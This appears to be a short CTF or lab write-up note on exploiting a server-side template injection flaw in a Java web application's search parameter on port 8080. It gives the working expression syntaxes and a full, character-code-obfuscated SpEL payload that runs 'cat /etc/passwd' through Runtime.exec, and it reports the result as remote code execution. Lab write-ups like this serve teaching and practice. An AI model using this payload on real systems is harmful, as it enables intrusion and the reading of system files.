# Exploitation SSTI port 8080
<hr>

![[search_req.png]]

After confirming the `name` parameter from the search bar is vulnerable, try to execute commands on the server.

Something that I missed for a while was:

![[missed.png]]

Which resulted very important for further exploitation.

The only payloads that work are:

```
#{exp}
*{exp}
```

Using the `*` symbol the output seems cleaner. Next I looked up for some Java payloads to [test](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#java---retrieve-etcpasswd).

With the following payload I was able to retrieve the `/etc/passwd` file.

```
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
```

![[etc-passwd.png]]

As a conclusion an SSTI vulnerability lead to RCE in the server machine.

Further RCE exploitation [[Exploitation RCE port 8080]]